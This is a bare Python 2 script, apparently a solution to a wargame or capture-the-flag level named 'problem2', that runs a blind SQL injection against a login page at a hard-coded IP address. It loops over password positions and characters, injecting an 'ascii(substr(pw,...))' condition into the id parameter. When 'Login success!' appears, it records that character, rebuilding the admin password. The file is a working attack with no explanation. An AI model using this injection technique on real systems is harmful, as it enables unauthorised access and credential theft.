# -*- coding: cp949 -*-
import urllib
import httplib
import hashlib

key=str()
for i in range(1,20):
    for a in range(ord('a'),127):
        HTTP=httplib.HTTPConnection("61.38.179.143")
        Param=urllib.urlencode({})
        Headers={}
        HTTP.request("GET","/problem2/index.php?id=admin%27%20and%20ascii(substr(pw,"+str(i)+",1))="+str(a)+"%23&pw=guest",Param,Headers)
        Result=HTTP.getresponse().read()
        if "Login success!" in Result:
            key+=chr(a)
            print str(i) + " --> "+chr(a)
            break
        #print Result
print key
# pw is blind
